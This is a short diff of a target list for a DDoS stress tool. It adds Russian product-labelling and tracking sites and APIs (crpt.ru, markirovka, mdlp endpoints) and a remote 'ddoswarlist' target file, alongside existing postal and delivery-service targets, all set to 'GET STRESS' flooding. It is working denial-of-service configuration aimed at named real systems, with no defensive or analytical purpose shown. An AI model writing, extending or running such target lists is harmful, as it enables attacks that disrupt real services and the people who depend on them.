@@ -1,4 +1,6 @@
--c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/post.lst --http-methods POST
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru --http-methods GET STRESS
+
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET STRESS
 
 https://dostavista.ru https://www.delivery-club.ru/moscow https://dotochki.com https://www.pochta.ru https://podpiska.pochta.ru https://zakaznoe.pochta.ru https://otpravka.pochta.ru --http-methods GET STRESS
 
